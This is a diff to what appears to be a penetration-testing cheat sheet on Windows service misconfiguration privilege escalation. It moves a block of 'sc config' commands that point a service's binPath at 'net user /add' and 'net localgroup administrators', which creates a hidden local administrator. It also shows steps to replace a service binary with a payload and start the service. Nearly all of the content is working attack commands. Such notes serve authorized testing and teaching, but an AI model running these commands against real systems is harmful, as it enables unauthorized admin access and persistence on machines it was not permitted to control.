@@ -21,15 +21,6 @@ sc stop {service-name}
 sc config {service-name} binPath= "E:\Service.exe"
 ```
 
-*Create a user*
-```Windows
-sc config {service-name} binPath= net user /add {username} {password}"
-sc start {service-name}
-sc stop {service-name}
-sc config {service-name} binPath = net localgroup administrators {username} /add
-sc start {service-name}
-```
-
 *Replace the service binary with a created payload*
 ```Windows
 icacls C:\{binary-path}
@@ -38,5 +29,14 @@ icacls C:\{binary-path}
 
 *Start the desired service*
 ```Windows
+sc start {service-name}
+```
+
+*Create a user*
+```Windows
+sc config {service-name} binPath= net user /add {username} {password}"
+sc start {service-name}
+sc stop {service-name}
+sc config {service-name} binPath = net localgroup administrators {username} /add
 sc start {service-name}
 ```
